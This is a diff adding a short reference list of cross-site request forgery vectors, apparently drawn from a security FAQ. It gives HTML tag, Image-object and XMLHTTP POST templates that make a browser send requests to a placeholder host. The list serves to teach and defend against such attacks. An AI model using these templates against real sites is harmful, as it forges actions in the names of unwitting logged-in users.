@@ -1,0 +1,49 @@
+IMG SRC
+  <img src="http://host/?command">
+ 
+
+SCRIPT SRC
+  <script src="http://host/?command">
+ 
+
+IFRAME SRC
+  <iframe src="http://host/?command">
+
+JavaScript Methods
+ 
+
+'Image' Object
+  <script>
+  var foo = new Image();
+  foo.src = "http://host/?command";
+  </script>
+ 
+
+'XMLHTTP' Object (See "Can applications using only POST be vulnerable?" for when this can be used)
+  IE
+  <script>
+  var post_data = 'name=value';
+  var xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  xmlhttp.open("POST", 'http://url/path/file.ext', true);
+  xmlhttp.onreadystatechange = function () {
+  if (xmlhttp.readyState == 4)
+  {
+  alert(xmlhttp.responseText);
+  }
+  };
+  xmlhttp.send(post_data);
+  </script>
+  
+Mozilla
+  <script>
+  var post_data = 'name=value';
+  var xmlhttp=new XMLHttpRequest();
+  xmlhttp.open("POST", 'http://url/path/file.ext', true);
+  xmlhttp.onreadystatechange = function () {
+  if (xmlhttp.readyState == 4)
+  {
+  alert(xmlhttp.responseText);
+  }
+  };
+  xmlhttp.send(post_data);
+      </script>
